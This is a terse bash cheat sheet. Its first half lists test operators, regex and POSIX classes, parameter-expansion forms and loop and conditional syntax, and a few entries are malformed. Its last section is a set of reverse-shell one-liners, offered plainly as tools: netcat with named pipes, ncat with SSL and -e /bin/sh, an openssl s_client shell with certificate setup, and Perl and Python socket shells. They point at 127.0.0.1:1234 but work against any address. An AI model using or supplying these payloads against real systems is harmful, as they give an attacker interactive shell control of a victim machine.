```
#!/bin/bash
# sed (GNU sed) 4.9
# GNU Awk 5.2.1, API 3.2, (GNU MPFR 4.2.0, GNU MP 6.2.1)
# grep (GNU grep) 3.8
# GNU bash, version 5.2.15(1)-release
# IFS=$' \t\n'
[[STRING]],= == != > < && ||  [INTEGER], test -a -o ! -eq -ne -gt,\> -lt,\< -ge -le -z -n -str , -e -f -s -d -b -c -p -h -L -S -t -r -w -x -g -k -O -G -N -nt -ot -ef
REGULAR, ^ . * $ [] [^ ] \ \< \> ... x\{m\} x\{m,\} x\{m,n\} + ? | () (...)(...)\1\2 x{m} x{m,} x{m,n}
#POSIX, [:alnum:] [:alpha:] [:digit:] [:blank:] [:lower:] [:upper:] [:punct:] [:space:] [:graph:] [:cntrl:] 
META CHAR, \b \B \d \D \w \W \n \s \S \r \t \v \f
# touch {ex{1..3},ex4}.sh , touch {ex[1-3],ex4}.sh
# ${} , $(ls -aShl) , $((int++)) , () array
${string: offset:length} #string and array
${variable#pattern}  /l-r/ del pattern
${variable##pattern} /l-r/ del pattern*
${variable%pattern}  /r-l/ del pattern
${variable%%pattern} /r-l/ del *pattern
${variable/pattern/string}  /l-r/ pattern=string 
${variable//pattern/string} /l-r/ pattern = string next
${variable//*[byte|byte1|byte3)/string} /l-r/ del last byte /string
${variable//[byte|byte1]/string} /l-r/ /byte/string

for name [ [in [words …] ] ; ] do commands; done
for (( expr1 ; expr2 ; expr3 )) ; do commands ; done

if test-commands; then
  consequent-commands;
[elif more-test-commands; then
  more-consequents;]
[else alternate-consequents;]
fi

case word in
    [ [(] pattern [| pattern]…) command-list ;;]…
esac

select name [in words …]; do commands; done
until test-commands; do consequent-commands; done
while test-commands; do consequent-commands; done
function name [()] {} , functionName(){} # $0 $1...$9 $# $* $@ $? $$ $! local return
source .sh, . .sh

mkfifo f ; cat f | sh -i 2>&1 | nc 127.0.0.1 1234 > f
mknod b p && nc 127.0.0.1 1234 0<b | sh -i 1>b

ncat --ssl -l 1234
ncat --ssl 127.0.0.1 1234 -e /bin/sh

openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 1234
mkfifo f ; sh -i < f 2>&1 | openssl s_client -quiet -connect 127.0.0.1:1234 > f

perl -e 'use Socket;$i="127.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
